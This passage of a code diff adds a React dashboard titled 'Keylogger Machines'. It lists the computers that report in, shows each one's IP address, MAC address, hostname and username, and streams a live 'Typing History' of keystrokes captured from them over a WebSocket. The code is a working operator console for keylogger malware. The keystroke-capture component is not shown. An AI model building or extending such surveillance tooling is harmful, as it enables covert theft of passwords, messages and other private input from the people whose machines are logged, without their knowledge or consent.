+            const position = (1 - relativeTime) * 90 + 5; // Inverted because newest is at top
+            
+            timePoints.push({
+              timestamp: event.timestamp,
+              position: position,
+              timeLabel: minuteKey
+            });
+          }
+        }
+        
+        return timePoints;
+      };
+      
+      const timePoints = createTimePoints();
+
+      if (loading) {
+        return (
+          <div className="text-center p-5">
+            <div className="spinner-border" role="status">
+              <span className="visually-hidden">Loading...</span>
+            </div>
+          </div>
+        );
+      }
+
+      if (!machine) {
+        return (
+          <div className="text-center p-5 text-muted">
+            <i className="bi bi-exclamation-triangle display-1"></i>
+            <h5 className="mt-3">Machine not found</h5>
+            <button className="btn btn-primary mt-3" onClick={onBack}>
+              Return to Machine List
+            </button>
+          </div>
+        );
+      }
+
+      return (
+        <div>
+          <div className="mb-3">
+            <button className="btn btn-outline-secondary" onClick={onBack}>
+              <i className="bi bi-arrow-left me-2"></i>Return to Machine List
+            </button>
+          </div>
+
+          <div className="card mb-4">
+            <div className="card-header d-flex justify-content-between align-items-center">
+              <div className="d-flex align-items-center">
+                <span className={`status-dot me-3 ${machine.active ? 'active' : 'inactive'}`}></span>
+                <div>
+                  <h4 className="mb-0">{machine.display_username}</h4>
+                  <small className="text-muted">
+                    {machine.active ? 'Active' : 'Inactive'} • First connected {formatDate(machine.first_login)}
+                  </small>
+                </div>
+              </div>
+              <div className="fs-2">
+                {getOSIcon(machine.system)}
+              </div>
+            </div>
+            <div className="card-body">
+              <div className="row">
+                <div className="col-md-6">
+                  <div className="mb-3">
+                    <strong className="text-muted">System Details:</strong>
+                    <div className="mt-1">
+                      <div><strong>Operating System:</strong> {machine.system} {machine.release}</div>
+                      <div><strong>Version:</strong> {machine.version}</div>
+                      <div><strong>Processor:</strong> {machine.processor}</div>
+                      <div><strong>Architecture:</strong> {machine.machine}</div>
+                      <div><strong>Computer Name:</strong> {machine.node}</div>
+                    </div>
+                  </div>
+                </div>
+                <div className="col-md-6">
+                  <div className="mb-3">
+                    <strong className="text-muted">Network and User Details:</strong>
+                    <div className="mt-1">
+                      <div><strong>IP Address:</strong> <span className="font-monospace">{machine.ip_address}</span></div>
+                      <div><strong>MAC Address:</strong> <span className="font-monospace">{machine.mac_address}</span></div>
+                      <div><strong>Username:</strong> {machine.machine_username}</div>
+                      {machine.title && <div><strong>Title:</strong> {machine.title}</div>}
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div className="row g-3 mb-4">
+            <div className="col-md-4">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-keyboard"></i></div>
+                  <div className="kpi-label">Total Events</div>
+                  <div className="kpi-value">{eventsLoading ? '...' : eventsCount.toLocaleString()}</div>
+                </div>
+              </div>
+            </div>
+            <div className="col-md-4">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon"><i className="bi bi-clock-history"></i></div>
+                  <div className="kpi-label">Displayed Events</div>
+                  <div className="kpi-value">{events.length}</div>
+                </div>
+              </div>
+            </div>
+            <div className="col-md-4">
+              <div className="card kpi-card p-3">
+                <div className="kpi-content">
+                  <div className="kpi-icon">
+                    <i className={`bi ${socketConnected ? 'bi-wifi text-success' : 'bi-wifi-off text-danger'}`}></i>
+                  </div>
+                  <div className="kpi-label">WebSocket</div>
+                  <div className="kpi-value">{socketConnected ? 'Connected' : 'Disconnected'}</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div className="card">
+            <div className="card-header d-flex justify-content-between align-items-center">
+              <h5 className="mb-0">Typing History</h5>
+              <div>
+                <button 
+                  className={`btn btn-sm ${autoScroll ? 'btn-success' : 'btn-outline-secondary'}`}
+                  onClick={toggleAutoScroll}
+                >
+                  <i className={`bi ${autoScroll ? 'bi-pause-fill' : 'bi-play-fill'} me-1`}></i>
+                  {autoScroll ? 'Stop Scroll' : 'Auto Scroll'}
+                </button>
+                <button 
+                  className="btn btn-sm btn-outline-primary ms-2"
+                  onClick={scrollToBottom}
+                >
+                  <i className="bi bi-arrow-down me-1"></i>
+                  Scroll to Bottom
+                </button>
+              </div>
+            </div>
+            <div className="card-body p-0">
+              {eventsLoading ? (
+                <div className="text-center p-5">
+                  <div className="spinner-border" role="status">
+                    <span className="visually-hidden">Loading events...</span>
+                  </div>
+                </div>
+              ) : events.length === 0 ? (
+                <div className="text-center p-5 text-muted">
+                  <i className="bi bi-keyboard display-1"></i>
+                  <h5 className="mt-3">No typing events</h5>
+                  <p>No typing events recorded for this machine</p>
+                </div>
+              ) : (
+                <div className="timeline-container" ref={timelineRef}>
+                  <div className="timeline-sidebar">
+                    {timePoints.map((point, index) => (
+                      <div 
+                        key={index}
+                        className="time-marker"
+                        style={{ top: `${point.position}%` }}
+                      >
+                        {point.timeLabel}
+                      </div>
+                    ))}
+                  </div>
+                  <div className="timeline-content-area">
+                    {processedText || 'No data to display...'}
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      );
+    }
+
+    // Main component with routing
+    function App() {
+      const [currentView, setCurrentView] = useState('machines');
+      const [selectedMachineId, setSelectedMachineId] = useState(null);
+
+      const showMachineDetail = (machineId) => {
+        setSelectedMachineId(machineId);
+        setCurrentView('machine-detail');
+      };
+
+      const showMachinesList = () => {
+        setCurrentView('machines');
+        setSelectedMachineId(null);
+      };
+
+      return (
+        <div className="container-fluid p-4">
+          {/* Header */}
+          <header className="dashboard-header d-flex justify-content-between align-items-center mb-4">
+            <div>
+              <h1 className="h3 mb-0">
+                {currentView === 'machines' ? 'Keylogger Machines' : 'Machine Details'}
+              </h1>
+              <p className="text-body-secondary mb-0">
+                {currentView === 'machines' ? 'Machine Management and Monitoring' : 'View Typing and Details'}
+              </p>
+            </div>
+            <div>
+              <span className="badge text-bg-success">● Live</span>
+            </div>
+          </header>
+
+          {/* Dynamic content */}
+          {currentView === 'machines' && (
+            <MachinesListView onMachineSelect={showMachineDetail} />
+          )}
+          {currentView === 'machine-detail' && selectedMachineId && (
+            <MachineDetailView 
+              machineId={selectedMachineId} 
+              onBack={showMachinesList} 
+            />
+          )}
+        </div>
+      );
+    }
+
+    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
   </script>
 </body>
 </html>
